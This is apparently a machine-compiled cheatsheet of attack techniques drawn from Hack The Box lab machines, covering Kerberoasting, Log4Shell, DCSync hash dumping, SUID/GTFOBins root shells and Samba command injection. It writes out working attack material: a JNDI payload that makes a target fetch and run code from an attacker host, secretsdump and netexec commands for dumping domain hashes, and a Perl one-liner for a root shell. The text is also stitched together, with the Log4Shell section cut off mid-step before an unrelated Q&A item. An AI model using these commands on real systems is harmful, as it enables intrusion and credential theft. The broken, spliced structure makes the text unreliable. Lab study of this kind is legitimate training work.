# Kerberoasting in Active Directory

## How It Works
Kerberoasting is an attack against the Kerberos authentication protocol used in Windows Active Directory environments. The process involves:
1.  **Ticket Request:** An attacker with a valid domain account authenticates to the Key Distribution Center (KDC) and requests a Ticket-Granting Service (TGS) for a specific service Principal Name (SPN).
2.  **Encryption:** The Domain Controller encrypts the response using the **service user’s password hash** (not the user's hash).
3.  **Offline Brute Force:** Instead of sending the encrypted ticket to the service, the attacker captures it and performs an offline brute-force attack to crack the password associated with the service account.

*(seen on: htb-active)*

## HTB Machines Demonstrating Kerberoasting
The following machines utilize Kerberoasting techniques:

*   **htb-active**: Used Kerberoasting against a Windows Domain as a primary learning objective. (seen on: htb-active)
*   **htb-sauna**: Used Kerberoast brute force on usernames to identify users and locate a target with the pre-authentication flag set. (seen on: htb-sauna)
*   **htb-tombwatcher**: Used targeted Kerberoasting via BloodHound to find a path to another user. (seen on: htb-tombwatcher)
*   **htb-search**: Used LDAP dumping to find a Kerberoastable user. (seen on: htb-search)

# CVE-2021-44228 (Log4Shell) Exploitation Cheatsheet

## Overview
CVE-2021-44228 is a critical vulnerability in the Log4j library that allows for Remote Code Execution (RCE) via JNDI (Java Naming and Directory Interface) lookups. Attackers can inject malicious payloads into log inputs, causing the application to fetch and execute arbitrary code from an attacker-controlled server. (seen on: htb-crafty, htb-ethereal, htb-fatty, htb-haystack)

## Attack Phases

### Foothold
*   **Minecraft Chat Injection (Windows)**
    *   **Technique:** Injecting a JNDI LDAP payload into the Minecraft chat to trigger the vulnerable Log4j library on the server.
    *   **Tool:** `log4j-shell-poc` (Python script).
    *   **Command:**

        ```bash
        python poc.py --userip <ATTACKER_IP> --webport 8000 --lport 443
        ```
    *   **Payload:** The script generates a payload like `${jndi:ldap://<ATTACKER_IP>:1389/a}`.
    *   **Execution:** Send the payload via Minecraft chat:

## Q12 — DCSync attack

**Question:** Which HTB machines demonstrate the DCSync attack and how does it work?

**Answer:**

# DCSync Attack Cheatsheet

## Overview
DCSync is an attack technique where an attacker with sufficient privileges (typically `Replicating Directory Changes` or `Replicating Directory Changes All`) can request the Active Directory database (NTDS.dit) from a Domain Controller (DC) as if they were another DC. This allows the extraction of password hashes for all domain accounts, including the Domain Administrator.

## Observed Machines
The following HTB machines demonstrate the DCSync attack:
*   **htb-vintage** (Foothold/PrivEsc)
*   **htb-sauna** (Privilege Escalation)
*   **htb-sizzle** (Privilege Escalation)
*   **htb-flight** (Privilege Escalation)

## Techniques & Commands

### 1. Using `secretsdump.py` (Impacket)
This is the most common method, allowing the attack to be run from an external host (e.g., Kali) without port forwarding, provided TCP 445, 135, and high RPC ports are accessible.

*   **Standard DCSync (Password Auth):**
    ```bash
    secretsdump.py 'username:password@target_ip'
    ```
    *   *Example:* `secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'` (seen on: htb-sauna)
    *   *Example:* `secretsdump.py -just-dc mrlky:Football#7@10.10.10.103` (seen on: htb-sizzle)

*   **Kerberos Ticket Auth:**
    ```bash
    secretsdump.py -k -no-pass target_domain
    ```
    *   *Note:* May fail due to clock skew or SPN validation. (seen on: htb-flight)

*   **Targeted User Dump (Workaround for SPN/Clock Issues):**
    If a full dump fails due to `KRB_AP_ERR_SKEW` or SPN restrictions, use `-just-dc-user` to extract data for a specific user (e.g., Administrator).
    ```bash
    secretsdump.py -k -no-pass target_domain -just-dc-user administrator
    ```
    *   *Note:* This implies the `-just-dc` switch. (seen on: htb-flight)

### 2. Using `netexec` (NXC)
Can be used to dump NTDS hashes directly via SMB if a valid Kerberos ticket (ccache) is available.

*   **Command:**
    ```bash
    KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache --ntds --user administrator
    ```
    *   *Output:* Dumps NTDS hashes to a local log file. (seen on: htb-vintage)

## Key Considerations
*   **Prerequisites:** Requires a user account with `Replicating Directory Changes` or `Replicating Directory Changes All` permissions.
*   **Network Access:** Requires access to the DC on TCP 445, 135, and dynamic RPC ports.
*   **Time Synchronization:** Kerberos-based DCSync is sensitive to clock skew. If `KRB_AP_ERR_SKEW` occurs, ensure time is synchronized or use the `-just-dc-user` flag. (seen on: htb-flight)
*   **SPN Validation:** Some environments restrict full DRSUAPI dumps via SPN target name validation. Using `-just-dc-user` can bypass this restriction. (seen on: htb-flight)

**Question:** How are SUID binaries and GTFOBins abused for Linux privilege escalation across HTB machines?

**Answer:**

# Linux Privilege Escalation: SUID Binaries & GTFOBins

## Recon & Enumeration
*   **Identify SUID Binaries**: Use `find` to locate files owned by root with the SUID bit set.
    ```bash
    find / -type f -user root -perm -4000 2>/dev/null
    ```
    *(seen on: htb-bank, htb-magic)*
*   **Automated Enumeration**: Run `linpeas` to automatically highlight interesting SUID binaries and other privesc vectors.
    *(seen on: htb-mango, htb-toby)*
*   **Check Group Restrictions**: Verify if SUID binaries have group execution restrictions (e.g., `-rwsr-x---`) and check `/etc/group` to see if your user belongs to that group.
    ```bash
    cat /etc/group | grep <group_name>
    ```
    *(seen on: htb-magic)*

## Foothold & Exploitation (GTFOBins)
*   **Perl SUID Abuse**: If `perl` has SUID or capabilities, attempt to drop a root shell using `POSIX::setuid`.
    ```bash
    /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
    ```
    *(seen on: htb-nunchucks)*
*   **GTFOBins Failure Analysis**: If the standard GTFOBins one-liner fails to return a shell but `whoami` returns root, investigate security modules like **AppArmor**.
    *   Check profiles in `/etc/apparmor.d`.
    *   Note that AppArmor may block execution of scripts from `/tmp` or specific binaries even if UID is 0.
    *(seen on: htb-nunchucks)*
*   **SUID Binary Execution**: If a SUID binary (like `/bin/sysinfo` or `/var/htb/bin/emergency`) allows command execution or has known vulnerabilities, exploit it to gain root.
    *(seen on: htb-magic, htb-bank)*

## Privilege Escalation (Specific Contexts)
*   **Apache `mpm-itk` Restrictions**: If running as `www-data` via Apache `mpm-itk`, SUID binaries may fail with "Operation not permitted" due to seccomp filters or `LimitUIDRange`/`LimitGIDRange` configurations.
    *   Check Apache MPM configuration for `LimitUIDRange`.
    *   This prevents `setuid()` calls from escalating to root.
    *(seen on: htb-pandora)*

## Notes
*   **SUID Bit**: Indicated by `s` in the execute permission field (e.g., `-rwsr-xr-x`).
*   **AppArmor**: Can restrict binary behavior even after successful UID change, requiring profile analysis for bypass.
*   **Seccomp**: Used by `mpm-itk` to block privilege escalation system calls.

# Samba RCE Exploitation Cheatsheet

## Foothold

*   **CVE-2026-4480 (Samba Printing Subsystem)**
    *   **Vulnerability:** OS command injection in the Samba printing subsystem. Samba passes the client-controlled job description string to the command configured with the “print command” setting via the `%J` substitution character without escaping shell meta characters.
    *   **Impact:** Remote Code Execution (CVSS 10.0).
    *   **Exploitation:** Send a specially crafted print job description containing unescaped shell characters. Samba only swaps single quotes for underscores, leaving other shell metacharacters intact for injection.
    *   (seen on: htb-abducted)

*   **Samba 3.0.20 < 3.0.25rc3 'Username' map script Command Execution**
    *   **Vulnerability:** Command execution via the 'Username' map script.
    *   **Exploitation:** Utilize Metasploit exploit `exploits/unix/remote/16320.rb`.
    *   **Command:**
        ```bash
        searchsploit -m exploits/unix/remote/16320.rb
        ```
    *   (seen on: htb-lame)
